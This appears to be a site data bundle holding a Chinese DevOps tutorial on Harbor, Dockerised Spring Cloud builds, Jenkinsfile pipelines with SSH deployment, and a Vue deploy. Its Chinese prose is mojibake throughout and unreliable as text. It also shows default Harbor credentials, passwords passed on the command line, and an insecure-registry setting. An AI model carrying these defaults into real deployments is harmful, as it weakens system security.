å»ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',charsets:{cjk:!0}},{title:"Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",frontmatter:{title:"Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/506",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/506.Jenkins(%E4%B8%83)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8A%EF%BC%89.html",relativePath:"04.è¿ç»´/50.Jenkins/506.Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md",key:"v-f2dce1b0",path:"/jenkins/506/",headers:[{level:2,title:"Harbor éåä»åºå®è£åä½¿ç¨",slug:"harbor-éåä»åºå®è£åä½¿ç¨",normalizedTitle:"harbor éåä»åºå®è£åä½¿ç¨",charIndex:269},{level:3,title:"Harbor å®è£",slug:"harbor-å®è£",normalizedTitle:"harbor å®è£",charIndex:734},{level:3,title:"Harbor ä½¿ç¨",slug:"harbor-ä½¿ç¨",normalizedTitle:"harbor ä½¿ç¨",charIndex:1263},{level:3,title:"æ¨éå°éåä»åº",slug:"æ¨éå°éåä»åº",normalizedTitle:"æ¨éå°éåä»åº",charIndex:1440},{level:2,title:"å¾®æå¡æå»ºå°dockeréå",slug:"å¾®æå¡æå»ºå°dockeréå",normalizedTitle:"å¾®æå¡æå»ºå° docker éå",charIndex:2148},{level:2,title:"jenkinsèªå¨åæå¡æåéåå¹¶å¯å¨",slug:"jenkinsèªå¨åæå¡æåéåå¹¶å¯å¨",normalizedTitle:"jenkins èªå¨åæå¡æåéåå¹¶å¯å¨",charIndex:8540},{level:2,title:"vue åç«¯ä½¿ç¨Jenkinsé¨ç½²",slug:"vue-åç«¯ä½¿ç¨jenkinsé¨ç½²",normalizedTitle:"vue åç«¯ä½¿ç¨ jenkins é¨ç½²",charIndex:14905}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Harbor éåä»åºå®è£åä½¿ç¨ Harbor å®è£ Harbor ä½¿ç¨ æ¨éå°éåä»åº å¾®æå¡æå»ºå°dockeréå jenkinsèªå¨åæå¡æåéåå¹¶å¯å¨ vue åç«¯ä½¿ç¨Jenkinsé¨ç½²",content:'å¤§è´æµç¨è¯´æï¼\n1. å¼åäººåæ¯å¤©æä»£ç æäº¤å° Gitlab ä»£ç ä»åº\n2.Jenkins ä» Gitlab ä¸­æåé¡¹ç®æºç ï¼ç¼è¯å¹¶ææ jar åï¼ç¶åæå»ºæ Docker éåï¼å°éåä¸ä¼ å° Harbor ç§æä»åºã\n3.Jenkins åé SSH è¿ç¨å½ä»¤ï¼è®©çäº§é¨ç½²æå¡å¨å° Harbor ç§æä»åºæåéåå°æ¬å°ï¼ç¶ååå»ºå®¹å¨ã\n4. æåï¼ç¨æ·å¯ä»¥è®¿é®å°å®¹å¨\n\n> è¿éä¸è®²è¿° Docker çå®è£ååºç¡å½ä»¤çä½¿ç¨ï¼å­¦ dockers å¯ä»¥ç Docker æ¦å¿µãå½ä»¤ãDockerFile ç­çè¿ç¯å°±å¤äº è¿ç¯æç« \n\n\n# Harbor éåä»åºå®è£åä½¿ç¨\n\nHarborï¼æ¸¯å£ï¼æ¸¯æ¹¾ï¼æ¯ä¸ä¸ªç¨äºå­å¨ååå Docker éåçä¼ä¸çº§ Registry æå¡å¨ãé¤äº Harbor è¿ä¸ªç§æéåä»åºä¹å¤ï¼è¿æ Docker å®æ¹æä¾ç Registryãç¸å¯¹ Registryï¼Harbor å·æå¾å¤ä¼å¿ï¼\n\n 1. æä¾åå±ä¼ è¾æºå¶ï¼ä¼åç½ç»ä¼ è¾ Docker éåæ¯æ¯åå±çï¼èå¦ææ¯æ¬¡ä¼ è¾é½ä½¿ç¨å¨éæä»¶ (æä»¥\n    ç¨ FTP çæ¹å¼å¹¶ä¸éå)ï¼æ¾ç¶ä¸ç»æµãå¿é¡»æä¾è¯å«åå±ä¼ è¾çæºå¶ï¼ä»¥å±ç UUID ä¸ºæ è¯ï¼ç¡®å®\n    ä¼ è¾çå¯¹è±¡ã\n 2. æä¾ WEB çé¢ï¼ä¼åç¨æ·ä½éª åªç¨éåçåå­æ¥è¿è¡ä¸ä¼ ä¸è½½æ¾ç¶å¾ä¸æ¹ä¾¿ï¼éè¦æä¸ä¸ªç¨æ·ç\n    é¢å¯ä»¥æ¯æç»éãæç´¢åè½ï¼åæ¬åºåå¬æãç§æéåã\n 3. æ¯ææ°´å¹³æ©å±éç¾¤ å½æç¨æ·å¯¹éåçä¸ä¼ ä¸è½½æä½éä¸­å¨ææå¡å¨ï¼éè¦å¯¹ç¸åºçè®¿é®ååä½å\n    è§£ã\n 4. è¯å¥½çå®å¨æºå¶ ä¼ä¸ä¸­çå¼åå¢éæå¾å¤ä¸åçèä½ï¼å¯¹äºä¸åçèä½äººåï¼åéä¸åçæéï¼\n    å·ææ´å¥½çå®å¨æ§ã\n\n\n# Harbor å®è£\n\n 1. é¤äº docker ä»¥å¤ï¼è¿è¦å®è£ dockers-composeï¼Docker Compose å½ä»¤åä½¿ç¨ ä½ å¯ä»¥çè¿ç¯åå®¢\n 2. ä¸è½½ Harbor çåç¼©åï¼å°åï¼éè¦ç§å¼ä¸ç½ï¼ä¸è½½å®æå¼å§è§£å\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# ä¿®æ¹éç½®æä»¶åå®¹\nvim /opt/software/harbor/harbor.yml \n# ä¿®æ¹hostname\nhostname: ä½ èªå·±æºå¨çIP\n# ä¿®æ¹ç«¯å£\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. å®è£ Harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. å¯å¨ Harbor\n\ndocker-compose up -d å¯å¨\ndocker-compose stop åæ­¢\ndocker-compose restart éæ°å¯å¨\n\n\n1\n2\n3\n\n 5. è®¿é® Harbor http://IP:85ï¼é»è®¤è´¦æ·å¯ç ï¼admin/Harbor12345\n\n\n# Harbor ä½¿ç¨\n\n1. åå»ºé¡¹ç®\nHarbor çé¡¹ç®åä¸ºå¬å¼åç§æçï¼\n\n * å¬å¼é¡¹ç®ï¼ææç¨æ·é½å¯ä»¥è®¿é®ï¼éå¸¸å­æ¾å¬å±çéåï¼é»è®¤æä¸ä¸ª library å¬å¼é¡¹ç®ã\n * ç§æé¡¹ç®ï¼åªæææç¨æ·æå¯ä»¥è®¿é®ï¼éå¸¸å­æ¾é¡¹ç®æ¬èº«çéåã\n\næä»¬å¯ä»¥ä¸ºå¾®æå¡é¡¹ç®åå»ºä¸ä¸ªæ°çé¡¹ç®ï¼\n\n\n\n\n\n2. ç¨æ·åå»º\n\n\n\n3. ä¸ºç¨æ·åéé¡¹ç®\n\n\n\n\n\n\n# æ¨éå°éåä»åº\n\n# ææ ç­¾ï¼å½ä»¤ docker tag nginx:1.17.1 HarborçIP:ç«¯å£/Harboré¡¹ç®çåç§°/éååå­\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# æ¥ç\ndocker images\n# ä¼å¤ä¸æ¡éåæ°æ®\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109MB\n\n\n1\n2\n3\n4\n5\n6\n\n\næ Harbor å°åå å¥å° Docker ä¿¡ä»»åè¡¨\n\n# ç¼è¾dockeræä»¶\nvim /etc/docker/daemon.json\n# å å¥è¿å¥è¯\n"insecure-registries":["192.168.81.102:85"],\n# éå¯éç½®ådocker\nsystemctl restart docker\n# Harbor  ç test é¡¹ç®æ¯ç§æçï¼éè¦ç»å½\ndocker login -u admin -p Harbor12345 192.168.81.102:85\n# æ¨éå°Harborä»åºé\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\nå¶ä»æå¡ä¸è½½éåä¹éè¦æå°åæ·»å å° docker çéç½®æä»¶ä¸­ï¼å¹¶ä¸ä¹éè¦ä½¿ç¨ docker login è¿è¡ç»å½ãå¤å¶ä»¥ä¸çå½ä»¤ï¼å°å¶ä»æå¡å¨ä¸æ§è¡å³å¯ã\n\n\n\n\n# å¾®æå¡æå»ºå° docker éå\n\n1. æå¾®æå¡æäº¤å° SVN\n2. å¨ jenkins ä¸åå»ºä¸ä¸ª Pipelin ç±»åç itemï¼é¡¹ç®ï¼\n3. éç½® Pipelin item çæå»ºæ¶åæ°\n\n\n\n\n\n\n\n> è¿éè®²ä¸ç¹ï¼é¡¹ç®ä¸­å¾å¤ç jar æ¯æä¾èµå³ç³»çï¼å¦æåç¬ææä¸ªæå¡å¯è½ä¼åæ¾ä¸å°ä¾èµï¼æä»¥å»ºè®®ç¬¬ä¸æ¬¡å¯¹æ ¹ç®å½è¿è¡æåï¼ä¼æä¾èµå¨é¨å è½½å° maven åºä¸­ï¼åæåä¸ªæå¡æåå³å¯ã\n\n4. å¨æ¯ä¸ªæå¡ç pom æä»¶ä¸­æ·»å  plugin\n\n\x3c!-- å¸®å©è¯»åé¡¹ç®ä¸­çdockerfileæä»¶ï¼å¸®æä»¬æå»ºdockeréå --\x3e\n<plugin>\n    <groupId>com.spotify</groupId>\n    <artifactId>dockerfile-maven-plugin</artifactId>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactId}</repository>\n        \x3c!-- å®ä¹dockerfile æä»¶çåæ° --\x3e\n        <buildArgs>\n            \x3c!-- å®ä¹ä¸ä¸ª JAVA_FILE åæ°,æä¸ºæä»¬é¡¹ç®çåç§° --\x3e\n            <JAR_FILE>target/${project.build.finalName}.jar</JAR_FILE>\n        </buildArgs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. å¨æ¯ä¸ªæå¡çæ ¹ç®å½ä¸ç¼å Dockerfile æä»¶\n\nFROM openjdk:8-jdk-alpine\n# è¿ä¸ªä¼è¯»åå¨pomä¸­å£°æçåé\nARG JAR_FILE\nCOPY ${JAR_FILE} app.jar\n# å¯¹å¤ç«¯å£\nEXPOSE 10086\nENTRYPOINT ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. è®¾ç½®æå»ºåéåæ¨è³éåä»åº\n\n\n\n\n\n\n\n7. å¨é¡¹ç®çæ ¹ç®å½ä¸­ç¼å Jenkinsfile\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldImageName}"\n        // æ¨éå° dockersä»åº\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newImageName}"\n            echo "éåæ¨éæå"\n        }\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-ç¬¬${BUILD_NUMBER}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">æå»ºç»æ - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${PROJECT_NAME}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${BUILD_NUMBER}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${CAUSE}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins èªå¨åæå¡æåéåå¹¶å¯å¨\n\nè¿é¨æä½éè¦å®è£ä¸ä¸ª Publish Over SSH æä»¶ï¼å®è£å¥½åå¨ Manager Jenkins -> Configure System è¿è¡éç½®\n\n\n\næ´æ¹ Jenkinsfile èæ¬ï¼æ·»å è¿ç¨æºå¨æåéåå¹¶å¯å¨å®¹å¨ï¼å·ä½è¯­æ³æä¹ä½¿ç¨ï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ä¸­æ¥ç\n\n\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldImageName}"\n        // æ¨éå° dockersä»åº\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newImageName}"\n            echo "éåæ¨éæå"\n        }\n\n        // è¿ç¨è°ç¨èæ¬,port æå¥½ä¹æ·»å  jenkinsé¡¹ç®éç½®éçåæ°éç½®ï¼ä½ä¸ºåæ°ä¼ è¿æ¥\n        echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'test_103\', transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-ç¬¬${BUILD_NUMBER}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">æå»ºç»æ - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${PROJECT_NAME}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${BUILD_NUMBER}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${CAUSE}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\néæ°æå»ºï¼å¶ä»æå¡å¨å°±ä¼èªå¨æåäºã\n\n> å¶ä»æå¡å¨ä¸å®è¦æ jenkins æå¡å¨çå¬é¥ï¼æå»ºè¿ç¨ SSH ä¸ä¼è¾åºä»»ä½ä¿¡æ¯åªä¼åè¯ä½  EXEC æ§è¡äºå¤ä¹ï¼éè¦èªå·±å»æµä¸ä¸ã\n\n\n# vue åç«¯ä½¿ç¨ Jenkins é¨ç½²\n\n1. é¦åéè¦å®è£ NodeJS æä»¶\n2. å° Manager Jenkins->Global Tool Configuration->NodeJS\n\n\n\n3. åå»ºä¸ä¸ªæµæ°´çº¿çåç«¯é¡¹ç®ï¼æ ¹æ®èæ¬æéç½®è¡¥å¨\n\nnode {\n    stage(\'æåä»£ç \') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'æåï¼é¨ç½²ç½ç«\') {\n        //ä½¿ç¨NodeJSçnpmè¿è¡æåï¼è¿ä¸ªå ä»¥ä¸ç name ä¿æä¸è´\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====ä»¥ä¸ä¸ºè¿ç¨è°ç¨è¿è¡é¡¹ç®é¨ç½²========\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'master_server\',transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: \'\',execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes:false, patternSeparator: \'[, ]+\', remoteDirectory: \'/usr/share/nginx/html\',remoteDirectorySDF: false, removePrefix: \'dist\', sourceFiles: \'dist/**\')],usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nä»èæ¬ä¸­å¯ä»¥çåºï¼æä»¬éè¦ä¸ä¸ª branch åæ°ï¼è¿è¦éç½® åç«¯é¡¹ç®ç è¿ç¨ server å°å\n\n> è¿éæ²¡æä½¿ç¨ execCommand çå½ä»¤ï¼èæ¯éè¿ sourceFilesãremovePrefixãremoteDirectoryï¼sourceFiles ä»£è¡¨æä»¬ copy åªä¸ªæä»¶ï¼remoteDirectory è¿ç¨ç®å½ï¼ç¹å°±æ¯ copy å° nginx æå¨ç®å½\n> 57-62',normalizedContent:'å¤§è´æµç¨è¯´æï¼\n1. å¼åäººåæ¯å¤©æä»£ç æäº¤å° gitlab ä»£ç ä»åº\n2.jenkins ä» gitlab ä¸­æåé¡¹ç®æºç ï¼ç¼è¯å¹¶ææ jar åï¼ç¶åæå»ºæ docker éåï¼å°éåä¸ä¼ å° harbor ç§æä»åºã\n3.jenkins åé ssh è¿ç¨å½ä»¤ï¼è®©çäº§é¨ç½²æå¡å¨å° harbor ç§æä»åºæåéåå°æ¬å°ï¼ç¶ååå»ºå®¹å¨ã\n4. æåï¼ç¨æ·å¯ä»¥è®¿é®å°å®¹å¨\n\n> è¿éä¸è®²è¿° docker çå®è£ååºç¡å½ä»¤çä½¿ç¨ï¼å­¦ dockers å¯ä»¥ç docker æ¦å¿µãå½ä»¤ãdockerfile ç­çè¿ç¯å°±å¤äº è¿ç¯æç« \n\n\n# harbor éåä»åºå®è£åä½¿ç¨\n\nharborï¼æ¸¯å£ï¼æ¸¯æ¹¾ï¼æ¯ä¸ä¸ªç¨äºå­å¨ååå docker éåçä¼ä¸çº§ registry æå¡å¨ãé¤äº harbor è¿ä¸ªç§æéåä»åºä¹å¤ï¼è¿æ docker å®æ¹æä¾ç registryãç¸å¯¹ registryï¼harbor å·æå¾å¤ä¼å¿ï¼\n\n 1. æä¾åå±ä¼ è¾æºå¶ï¼ä¼åç½ç»ä¼ è¾ docker éåæ¯æ¯åå±çï¼èå¦ææ¯æ¬¡ä¼ è¾é½ä½¿ç¨å¨éæä»¶ (æä»¥\n    ç¨ ftp çæ¹å¼å¹¶ä¸éå)ï¼æ¾ç¶ä¸ç»æµãå¿é¡»æä¾è¯å«åå±ä¼ è¾çæºå¶ï¼ä»¥å±ç uuid ä¸ºæ è¯ï¼ç¡®å®\n    ä¼ è¾çå¯¹è±¡ã\n 2. æä¾ web çé¢ï¼ä¼åç¨æ·ä½éª åªç¨éåçåå­æ¥è¿è¡ä¸ä¼ ä¸è½½æ¾ç¶å¾ä¸æ¹ä¾¿ï¼éè¦æä¸ä¸ªç¨æ·ç\n    é¢å¯ä»¥æ¯æç»éãæç´¢åè½ï¼åæ¬åºåå¬æãç§æéåã\n 3. æ¯ææ°´å¹³æ©å±éç¾¤ å½æç¨æ·å¯¹éåçä¸ä¼ ä¸è½½æä½éä¸­å¨ææå¡å¨ï¼éè¦å¯¹ç¸åºçè®¿é®ååä½å\n    è§£ã\n 4. è¯å¥½çå®å¨æºå¶ ä¼ä¸ä¸­çå¼åå¢éæå¾å¤ä¸åçèä½ï¼å¯¹äºä¸åçèä½äººåï¼åéä¸åçæéï¼\n    å·ææ´å¥½çå®å¨æ§ã\n\n\n# harbor å®è£\n\n 1. é¤äº docker ä»¥å¤ï¼è¿è¦å®è£ dockers-composeï¼docker compose å½ä»¤åä½¿ç¨ ä½ å¯ä»¥çè¿ç¯åå®¢\n 2. ä¸è½½ harbor çåç¼©å